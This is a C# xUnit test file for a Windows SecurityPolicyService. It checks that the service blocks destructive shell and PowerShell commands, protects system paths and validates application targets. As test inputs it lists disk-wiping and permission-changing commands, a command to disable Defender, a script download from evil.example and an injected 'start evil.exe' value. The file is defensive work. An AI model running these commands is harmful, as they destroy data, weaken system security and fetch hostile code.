using Coclico.Services;
using Xunit;

namespace Coclico.Tests;

public sealed class SecurityPolicyTests
{
    [Theory]
    [InlineData("format c:")]
    [InlineData("FORMAT /FS:NTFS C:")]
    [InlineData("rd /s /q C:\\")]
    [InlineData("rmdir /S /Q C:\\Users")]
    [InlineData("del /f /s /q *")]
    [InlineData("rm -rf /")]
    [InlineData("diskpart")]
    [InlineData("bcdedit /set {default} bootmenupolicy legacy")]
    [InlineData("reg delete hklm\\software\\x")]
    [InlineData("net user administrator p@ss")]
    [InlineData("icacls C:\\ /grant Everyone:F")]
    [InlineData("takeown /f C:\\windows")]
    [InlineData("sc delete wuauserv")]
    [InlineData("sc stop bits")]
    public void IsCommandBlockedBlocksDestructivePatterns(string command)
    {
        ArgumentNullException.ThrowIfNull(command);
        Assert.True(new SecurityPolicyService().IsCommandBlocked(command.ToUpperInvariant()));
    }

    [Theory]
    [InlineData("notepad.exe")]
    [InlineData("cleanmgr /verylowdisk")]
    [InlineData("ping 1.1.1.1")]
    [InlineData("msiexec.exe /x {11111111-2222-3333-4444-555555555555}")]
    public void IsCommandBlockedAllowsNormalCommands(string command)
    {
        ArgumentNullException.ThrowIfNull(command);
        Assert.False(new SecurityPolicyService().IsCommandBlocked(command.ToUpperInvariant()));
    }

    [Theory]
    [InlineData("invoke-expression 'malicious'")]
    [InlineData("powershell -encodedcommand AAAA")]
    [InlineData("Invoke-WebRequest http://evil.example/x.ps1")]
    [InlineData("Remove-Item -Recurse C:\\Users")]
    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $true")]
    public void IsPowerShellBlockedBlocksDangerousPatterns(string script)
    {
        ArgumentNullException.ThrowIfNull(script);
        Assert.True(new SecurityPolicyService().IsPowerShellBlocked(script.ToUpperInvariant()));
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\cmd.exe")]
    [InlineData(@"c:\program files\app\app.exe")]
    [InlineData(@"c:\program files (x86)\app\app.exe")]
    [InlineData(@"C:\ProgramData\Microsoft\Windows\Start Menu\lnk.lnk")]
    [InlineData(@"C:\System Volume Information\tracking.log")]
    [InlineData(@"D:\$RECYCLE.BIN\x")]
    [InlineData(@"C:\EFI\boot\bootx64.efi")]
    public void IsProtectedPathProtectsSystemTrees(string path)
    {
        ArgumentNullException.ThrowIfNull(path);
        Assert.True(new SecurityPolicyService().IsProtectedPath(path.ToUpperInvariant()));
    }

    [Theory]
    [InlineData(@"C:\Users\x\AppData\Local\Temp\cleanup.exe")]
    [InlineData(@"D:\Games\game.exe")]
    public void IsProtectedPathAllowsUserPaths(string path)
    {
        ArgumentNullException.ThrowIfNull(path);
        Assert.False(new SecurityPolicyService().IsProtectedPath(path.ToUpperInvariant()));
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void IsApplicationAllowedEmptyNameReturnsFalse(string? appName)
    {
        Assert.False(new SecurityPolicyService().IsApplicationAllowed(appName!, out _));
    }

    [Fact]
    public void IsApplicationAllowedBlockedCommandReturnsFalse()
    {
        Assert.False(new SecurityPolicyService().IsApplicationAllowed("format.com", out _));
    }

    [Theory]
    [InlineData("ms-settings:", false)]
    [InlineData("ms-settings:appsfeatures", true)]
    [InlineData("ms-settings:privacy-microphone", true)]
    [InlineData("ms-settings:appsfeatures; start evil.exe", false)]
    [InlineData("ms-settings:apps features", false)]
    public void IsApplicationAllowedSettingsUriValidatedBySuffix(string target, bool expected)
    {
        Assert.Equal(expected, new SecurityPolicyService().IsApplicationAllowed(target, out _));
    }

    [Theory]
    [InlineData("notepad")]
    [InlineData("NOTEPAD.EXE")]
    [InlineData("calc")]
    [InlineData("taskmgr")]
    [InlineData("powershell")]
    [InlineData("cleanmgr.exe")]
    public void IsApplicationAllowedStandardSystemAppsAreAllowed(string appName)
    {
        Assert.True(new SecurityPolicyService().IsApplicationAllowed(appName, out _));
    }

    [Fact]
    public void IsApplicationAllowedExeOutsideApprovedLocationsIsRefused()
    {
        string exe = Path.Join(Path.GetTempPath(), "untrusted_policy_test.exe");
        File.WriteAllText(exe, "stub");

        try
        {
            Assert.False(new SecurityPolicyService().IsApplicationAllowed(exe, out _));
        }
        finally
        {
            File.Delete(exe);
        }
    }

    [Fact]
    public void IsApplicationAllowedNonExeFileIsRefused()
    {
        string file = Path.Join(Path.GetTempPath(), "policy_test.txt");
        File.WriteAllText(file, "data");

        try
        {
            Assert.False(new SecurityPolicyService().IsApplicationAllowed(file, out _));
        }
        finally
        {
            File.Delete(file);
        }
    }

    [Theory]
    [InlineData("randomappthatdoesnotexist")]
    [InlineData("C:\\does\\not\\exist.exe")]
    public void IsApplicationAllowedUnknownNameIsRefused(string appName)
    {
        Assert.False(new SecurityPolicyService().IsApplicationAllowed(appName, out _));
    }

    [Theory]
    [InlineData("del /f  /s   /q C:\\temp")]
    [InlineData("rd  /s /q C:\\")]
    [InlineData("rm -rf   /")]
    [InlineData("net   user  test pass")]
    [InlineData("format  c:")]
    public void IsCommandBlockedResistsSpacingVariations(string command)
    {
        ArgumentNullException.ThrowIfNull(command);
        Assert.True(new SecurityPolicyService().IsCommandBlocked(command.ToUpperInvariant()));
    }

    [Fact]
    public void IsCommandBlockedEmptyCommandIsAllowed()
    {
        Assert.False(new SecurityPolicyService().IsCommandBlocked(string.Empty));
    }

    [Fact]
    public void IsCommandBlockedNullCommandIsAllowed()
    {
        Assert.False(new SecurityPolicyService().IsCommandBlocked(null!));
    }
}
